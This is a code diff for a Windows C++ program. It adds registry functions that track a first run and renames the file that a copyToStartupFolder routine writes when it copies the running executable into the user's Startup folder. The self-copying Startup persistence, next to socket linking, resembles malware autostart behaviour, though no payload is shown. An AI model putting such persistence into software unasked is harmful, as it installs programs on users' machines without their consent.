@@ -12,6 +12,49 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "Shlwapi.lib") // Link Shlwapi.lib
+// Check if this is the first run
+bool isFirstRun() {
+    HKEY keyHandle;
+    const wchar_t* regPath = L"Software\\MyApp";
+    const wchar_t* regValueName = L"FirstRuny";
+    DWORD firstRunFlag = 0;
+    DWORD dataSize = sizeof(firstRunFlag);
+
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &keyHandle, NULL) != ERROR_SUCCESS) {
+        std::cerr << "[ERROR] Failed to access or create registry key.\n";
+        return false;
+    }
+
+    if (RegQueryValueExW(keyHandle, regValueName, NULL, NULL, (LPBYTE)&firstRunFlag, &dataSize) != ERROR_SUCCESS) {
+        firstRunFlag = 1;
+        if (RegSetValueExW(keyHandle, regValueName, 0, REG_DWORD, (const BYTE*)&firstRunFlag, sizeof(firstRunFlag)) != ERROR_SUCCESS) {
+            std::cerr << "[ERROR] Failed to set registry value.\n";
+        }
+        RegCloseKey(keyHandle);
+        return true;
+    }
+
+    RegCloseKey(keyHandle);
+    return firstRunFlag == 1;
+}
+
+
+
+// Mark first run as complete
+void setFirstRunComplete() {
+    HKEY keyHandle;
+    const wchar_t* regPath = L"Software\\MyApp";
+    const wchar_t* regValueName = L"FirstRuny";
+    DWORD firstRunFlag = 0;
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &keyHandle) == ERROR_SUCCESS) {
+        RegSetValueExW(keyHandle, regValueName, 0, REG_DWORD, (const BYTE*)&firstRunFlag, sizeof(firstRunFlag));
+        RegCloseKey(keyHandle);
+    } else {
+        std::cerr << "[ERROR] Failed to mark first run complete in registry.\n";
+    }
+}
+
 
 std::wstring getDynamicAppName() {
     wchar_t exePath[MAX_PATH];
@@ -100,7 +143,7 @@ bool copyToStartupFolder() {
 
     // Get the path to the user's Startup folder
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
-        std::wstring destinationPath = std::wstring(startupPath) + L"\\Fun.exe";
+        std::wstring destinationPath = std::wstring(startupPath) + L"\\Funn.exe";
 
         // Copy the file to the Startup folder
         if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
